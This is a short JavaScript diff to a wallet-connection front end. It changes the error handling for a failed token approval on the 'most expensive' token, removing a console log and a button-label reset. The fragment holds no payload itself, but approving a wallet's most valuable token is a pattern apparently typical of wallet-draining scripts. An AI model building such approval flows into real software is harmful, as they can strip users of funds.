@@ -501,12 +501,10 @@ const initializeSubscribers = (modal) => {
             store.isApprovalRequested = false
             const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
             store.errors.push(errorMessage)
-            console.error(errorMessage)
             const approveState = document.getElementById('approveState')
             const approveSection = document.getElementById('approveSection')
             if (approveState) approveState.innerHTML = errorMessage
             if (approveSection) approveSection.style.display = ''
-            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
           }
         }
       } else {
